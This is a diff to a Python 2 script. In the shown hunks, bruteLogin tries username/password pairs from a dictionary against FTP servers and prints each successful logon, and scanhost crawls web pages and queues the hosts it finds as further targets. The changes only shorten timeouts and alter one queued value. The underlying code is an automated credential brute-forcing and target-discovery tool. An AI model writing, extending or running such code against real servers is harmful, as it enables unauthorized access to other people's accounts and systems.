@@ -30,7 +30,7 @@ def bruteLogin(dic):
             passWord=dic[userName]
             print "[+] Trying: "+userName+"/"+passWord
             try:
-                with gevent.Timeout(10, False) as timeout:
+                with gevent.Timeout(3, False) as timeout:
                     ftp = ftplib.FTP(hostname)
                     ftp.login(userName, passWord)
                     print '\n[*] ' + str(hostname) +' FTP Logon Succeeded: '+userName+"/"+passWord
@@ -51,7 +51,7 @@ def scanhost():
         #connect to a URL
         print host
         try:
-            with gevent.Timeout(20, False) as timeout:
+            with gevent.Timeout(10, False) as timeout:
                 website = urllib2.urlopen(host)
                 #read html code
                 html = website.read()
@@ -64,7 +64,7 @@ def scanhost():
                             ip = socket.gethostbyname(link[2]) 
                             hosts.put(ip)
                             hostset.add(link[2])
-                            hostpool.put(link[2])
+                            hostpool.put(link[0])
                         except Exception,e:
                             print 'gethost:'+link[2]+str(e)
 
